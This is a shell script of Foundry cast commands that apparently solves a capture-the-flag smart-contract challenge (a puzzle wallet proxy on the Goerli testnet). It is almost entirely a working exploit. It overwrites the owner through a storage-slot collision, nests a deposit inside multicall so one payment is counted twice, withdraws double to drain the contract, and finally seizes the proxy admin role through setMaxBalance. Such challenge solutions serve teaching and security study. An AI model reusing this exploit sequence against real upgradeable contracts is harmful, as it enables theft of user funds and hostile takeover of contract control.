set -o allexport
source ./.env
source ./.env_public
set +o allexport

# ===================================

cast send $PROXY \
    "proposeNewAdmin(address)" \
    $PLAYER \
    --private-key $PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    --confirmations 3

cast send $PROXY \
    "addToWhitelist(address)" \
    $PLAYER \
    --private-key $PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    --confirmations 3


cast balance $PROXY \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
# 1000000000000000

cast calldata "deposit()"
# 0xd0e30db0

cast calldata "multicall(bytes[])" "[0xd0e30db0]"
# 0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000


# ------------------------------------------------------------------------------------------
# To solve the puzzle this call was ran from the Browser Console (F12) instead 
# of foundry cast, becaue of problems with passing the bytes[] parameter over 
# the command line.

cast  send $PROXY \
    "multicall(bytes[])" \
    "[\"0xd0e30db0\", \"0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000\"]"  \
    --value 1000000000000000 \
    --private-key $PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    --confirmations 3

# ------------------------------------------------------------------------------------------


# Withdraw 2x the amount deposited to empty the contract
cast  send $PROXY \
    "execute(address,uint256,bytes)" \
    $PLAYER  2000000000000000  0x \
    --private-key $PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    --confirmations 3


# Contract balance should be empty
cast call $PROXY \
    "balances(address)" \
    $PLAYER \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID


# Take over the proxy admin role we do this by writing
# the maxBalance which is ocupying the same storage slot.
cast send $PROXY \
    "setMaxBalance(uint256)" \
    $PLAYER \
    --private-key $PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    --confirmations 3


# Confirm proxy admin role
cast call $PROXY \
    "admin()" \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
